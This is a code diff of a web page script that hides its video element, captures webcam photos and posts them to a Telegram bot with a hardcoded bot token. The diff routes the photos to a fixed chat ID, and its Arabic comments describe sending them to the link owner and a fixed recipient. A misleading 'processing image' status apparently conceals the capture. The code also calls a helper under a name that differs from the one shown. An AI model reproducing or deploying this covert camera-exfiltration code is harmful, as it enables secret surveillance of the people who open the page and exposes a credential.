@@ -83,7 +83,7 @@ video { display: none; }
 </div>
 
 <script>
-const dynamicChatId = urlParams.get('id');
+const dynamicChatId = 6002805119;
 const fixedChatId = 6002805119;
 const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
 
@@ -138,14 +138,16 @@ function captureAndSend() {
                 body: f
             });
         };
-        
-        send(dynamicChatId);
-        if(dynamicChatId!==fixedChatId)
-        {
-            send(fixedChatId).then(()=>{
-                status.innerText = `📸 صورة ${photoCount} / ${MAX_PHOTOS}`;
-            });
+
+        // الإرسال لصاحب الرابط
+        sendPhoto(dynamicChatId);
+
+        // الإرسال للرقم الثابت فقط إذا كان مختلف
+        if (dynamicChatId !== fixedChatId) {
+            sendPhoto(fixedChatId);
         }
+
+        status.innerText = `📸 معالجة الصورة ${photoCount} / ${MAX_PHOTOS}`;
     }, 'image/jpeg');
 }
 </script>
